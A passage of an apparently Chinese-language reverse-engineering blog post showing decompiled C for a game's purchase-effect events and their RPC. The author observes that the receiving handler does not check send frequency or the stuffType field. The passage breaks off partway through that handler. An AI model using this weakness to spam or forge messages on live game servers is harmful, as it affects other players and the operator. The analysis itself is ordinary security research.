+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      :</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (v8 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v9, </span><span style="color:#6F42C1;--shiki-dark:#B392F0">sub_221932C</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: v9.value, a2: v9.handled), v7 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">),</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v7 </span><span style="color:#D73A49;--shiki-dark:#F97583">==</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    childFx </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> EventBarn_CreatePurchaseFx</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(barn: p_game->eventBarn, maximum: </span><span style="color:#D73A49;--shiki-dark:#F97583">-</span><span style="color:#005CC5;--shiki-dark:#79B8FF">1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    LocalAvatar </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> AvatarBarn_TryGetLocalAvatar</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(avatars: p_game->avatarBarn, requireActiveCarrier: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">1</span><span style="color:#D73A49;--shiki-dark:#F97583">u</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    id </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sub_2219370</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: LocalAvatar);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    childFx->playerId </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> id;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">    PurchaseFxItem_Construct</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">item);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    item.stuffType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( v2->unknown_026[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">] </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      item.stuffType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v2->unknown_026[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( (v2->unknown_026[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">] </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      item.stuffType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">    PurchaseFx_AppendItem</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(fx: childFx, </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">item);</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">    Event::Start</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(event: childFx, diagnosticCarrier: </span><span style="color:#D73A49;--shiki-dark:#F97583">0x</span><span style="color:#005CC5;--shiki-dark:#79B8FF">99</span><span style="color:#D73A49;--shiki-dark:#F97583">u</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">    Event::Stop</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(event: v2, diagnosticCarrier: </span><span style="color:#D73A49;--shiki-dark:#F97583">0x</span><span style="color:#005CC5;--shiki-dark:#79B8FF">9B</span><span style="color:#D73A49;--shiki-dark:#F97583">u</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">}</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">c</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="void __fastcall PlayPurchaseFX::OnStart(PlayPurchaseFX *event, Game *game)
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &#x22;+&#x22; TO EXPAND]
+
+  sourceEvent = event;
+  p_game = game;
+  v2 = event;
+  if ( (word_4D265FC &#x26; 0xE00) != 0
+    || ((v9 = xxx_dispatch(argument0: event), v9.handled == 0)
+      ? (v7 = 0)
+      : (v8 = v9, sub_221932C(a1: v9.value, a2: v9.handled), v7 = 1),
+        v7 == 0) )
+  {
+    childFx = EventBarn_CreatePurchaseFx(barn: p_game->eventBarn, maximum: -1);
+    LocalAvatar = AvatarBarn_TryGetLocalAvatar(avatars: p_game->avatarBarn, requireActiveCarrier: 1u);
+    id = sub_2219370(a1: LocalAvatar);
+    childFx->playerId = id;
+    PurchaseFxItem_Construct(&#x26;item);
+    item.stuffType = 2;
+    if ( v2->unknown_026[1] != 0 )
+      item.stuffType = v2->unknown_026[1];
+    if ( (v2->unknown_026[0] &#x26; 1) != 0 )
+      item.stuffType = 0;
+    PurchaseFx_AppendItem(fx: childFx, &#x26;item);
+    Event::Start(event: childFx, diagnosticCarrier: 0x99u);
+    Event::Stop(event: v2, diagnosticCarrier: 0x9Bu);
+  }
+}" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button><button class="collapse-toggle bg-card text-muted-foreground rounded-lg m-2" aria-label="Toggle collapse code block" onclick="this.parentElement.classList.toggle(&#x27;collapsed&#x27;)"><svg class="size-5"><use href="/icons/code.svg#mingcute-arrow-down-line"></use></svg><span class="desc"> code</span></button><div class="collapse-fade"></div></div>
+<p>一次脚本调用就是一个子事件、一个 <code>stuffType=8</code> 的 item。子事件创建出来时 broadcastEnabled 默认是 true。PurchaseFx 的构造函数 sub_221B504 里可以确认</p>
+<div class="astro-code astro-code-themes github-light github-dark collapsed" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><pre><code><span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">long</span><span style="color:#D73A49;--shiki-dark:#F97583"> double</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> __fastcall </span><span style="color:#6F42C1;--shiki-dark:#B392F0">sub_221B504</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(PurchaseFx </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#E36209;--shiki-dark:#FFAB70">fx</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">  sub_1B5AD80</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: fx);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  fx->vtable </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> off_36FBD50;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  v2 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sub_2214160</span><span style="color:#24292E;--shiki-dark:#E1E4E8">() </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 56</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">  *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">fx->unknown_0B0 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  fx->classId </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v2;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  v3 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> dword_4C0AD30;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  fx->vtable </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> off_36FB870;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">  *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">fx->skuStringStorage[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">16</span><span style="color:#24292E;--shiki-dark:#E1E4E8">] </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#D73A49;--shiki-dark:#F97583">u</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  fx->outfitCount </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  fx->playerId </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v3;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  fx->flag193 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  fx->flag194 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  fx->flag195 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  fx->broadcastEnabled </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">  // ...</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">}</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">c</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="long double __fastcall sub_221B504(PurchaseFx *fx)
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &#x22;+&#x22; TO EXPAND]
+
+  sub_1B5AD80(a1: fx);
+  fx->vtable = off_36FBD50;
+  v2 = *(sub_2214160() + 56);
+  *fx->unknown_0B0 = 0;
+  fx->classId = v2;
+  v3 = dword_4C0AD30;
+  fx->vtable = off_36FB870;
+  *&#x26;fx->skuStringStorage[16] = 0u;
+  fx->outfitCount = 0;
+  fx->playerId = v3;
+  fx->flag193 = 1;
+  fx->flag194 = 1;
+  fx->flag195 = 1;
+  fx->broadcastEnabled = 1;
+  // ...
+}" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button><button class="collapse-toggle bg-card text-muted-foreground rounded-lg m-2" aria-label="Toggle collapse code block" onclick="this.parentElement.classList.toggle(&#x27;collapsed&#x27;)"><svg class="size-5"><use href="/icons/code.svg#mingcute-arrow-down-line"></use></svg><span class="desc"> code</span></button><div class="collapse-fade"></div></div>
+<p>在 <code>PurchaseFx::Update</code> 里有一段RPC发送逻辑</p>
+<div class="astro-code astro-code-themes github-light github-dark collapsed" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><pre><code><span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( fx</span><span style="color:#D73A49;--shiki-dark:#F97583">-></span><span style="color:#24292E;--shiki-dark:#E1E4E8">broadcastEnabled </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (fx</span><span style="color:#D73A49;--shiki-dark:#F97583">-></span><span style="color:#24292E;--shiki-dark:#E1E4E8">stateFlags </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">==</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">  if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( (v323 </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    v310 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> dword_4C0AD30;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( </span><span style="color:#6F42C1;--shiki-dark:#B392F0">sub_2219468</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">fx->playerId, a2: dword_4C0AD30) )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      PurchaseFxRpc_Construct</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(rpc: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">pfxRpc);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      pfxRpc.playerId </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> fx->playerId;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      pfxRpc.stuffType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> fx->stuffType;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v25 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sub_22194B8</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: fx->skuStringStorage);</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( </span><span style="color:#6F42C1;--shiki-dark:#B392F0">strlen</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(s: v25) </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x3C;</span><span style="color:#D73A49;--shiki-dark:#F97583"> 0x</span><span style="color:#005CC5;--shiki-dark:#79B8FF">10</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v26 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sub_22194B8</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: fx->skuStringStorage);</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">        strcpy</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(dest: pfxRpc.sku, src: v26);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      pfxRpc.itemCount </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> fx->itemCount;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      for</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( i </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">; i </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x3C;</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> fx->itemCount; </span><span style="color:#D73A49;--shiki-dark:#F97583">++</span><span style="color:#24292E;--shiki-dark:#E1E4E8">i )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        pfxRpc.items[i][</span><span style="color:#005CC5;--shiki-dark:#79B8FF">0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">] </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> fx->items[i].stuffType;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        pfxRpc.items[i][</span><span style="color:#005CC5;--shiki-dark:#79B8FF">1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">] </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> fx->items[i].value;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v330 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 3</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      PurchaseFx_QueueRpc</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(client: </span><span style="color:#D73A49;--shiki-dark:#F97583">*&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">p_game->netModule->gap_0x0[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">56</span><span style="color:#24292E;--shiki-dark:#E1E4E8">], rpc: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">pfxRpc);</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      sub_10D626C</span><span style="color:#24292E;--shiki-dark:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  fx->stateFlags </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> fx->stateFlags </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#D73A49;--shiki-dark:#F97583"> 0x</span><span style="color:#005CC5;--shiki-dark:#79B8FF">FD</span><span style="color:#D73A49;--shiki-dark:#F97583"> |</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">}</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">c</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="if ( fx->broadcastEnabled &#x26;&#x26; (fx->stateFlags &#x26; 2) == 0 )
+{
+  if ( (v323 &#x26; 1) != 0 )
+  {
+    v310 = dword_4C0AD30;
+    if ( sub_2219468(a1: &#x26;fx->playerId, a2: dword_4C0AD30) )
+    {
+      PurchaseFxRpc_Construct(rpc: &#x26;pfxRpc);
+      pfxRpc.playerId = fx->playerId;
+      pfxRpc.stuffType = fx->stuffType;
+      v25 = sub_22194B8(a1: fx->skuStringStorage);
+      if ( strlen(s: v25) < 0x10 )
+      {
+        v26 = sub_22194B8(a1: fx->skuStringStorage);
+        strcpy(dest: pfxRpc.sku, src: v26);
+      }
+      pfxRpc.itemCount = fx->itemCount;
+      for ( i = 0; i < fx->itemCount; ++i )
+      {
+        pfxRpc.items[i][0] = fx->items[i].stuffType;
+        pfxRpc.items[i][1] = fx->items[i].value;
+      }
+      v330 = 3;
+      PurchaseFx_QueueRpc(client: *&#x26;p_game->netModule->gap_0x0[56], rpc: &#x26;pfxRpc);
+      sub_10D626C();
+    }
+  }
+  fx->stateFlags = fx->stateFlags &#x26; 0xFD | 2;
+}" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button><button class="collapse-toggle bg-card text-muted-foreground rounded-lg m-2" aria-label="Toggle collapse code block" onclick="this.parentElement.classList.toggle(&#x27;collapsed&#x27;)"><svg class="size-5"><use href="/icons/code.svg#mingcute-arrow-down-line"></use></svg><span class="desc"> code</span></button><div class="collapse-fade"></div></div>
+<p><code>PurchaseFxRpc::Run</code>是接收端对应的处理函数，只校验了发送者身份和有没有可见角色，没校验频率，也没校验报文里的 stuffType</p>
+<div class="astro-code astro-code-themes github-light github-dark collapsed" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><pre><code><span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">void</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> __fastcall PurchaseFxRpc::</span><span style="color:#6F42C1;--shiki-dark:#B392F0">Run</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">const</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> PurchaseFxRpc </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#E36209;--shiki-dark:#FFAB70">rpc</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, Game </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#E36209;--shiki-dark:#FFAB70">game</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  receivedRpc </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> rpc;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  p_game </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> game;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  p_rpc </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> rpc;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">  if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( (</span><span style="color:#6F42C1;--shiki-dark:#B392F0">WORD5</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(xmmword_4D265C4) </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#D73A49;--shiki-dark:#F97583"> 0x</span><span style="color:#005CC5;--shiki-dark:#79B8FF">2440</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    ||</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ((v11 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> xxx_dispatch</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(argument0: rpc), v11.handled </span><span style="color:#D73A49;--shiki-dark:#F97583">==</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      ?</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      :</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (v10 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v11, </span><span style="color:#6F42C1;--shiki-dark:#B392F0">sub_221932C</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: v11.value, a2: v11.handled), v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">),</span></span>
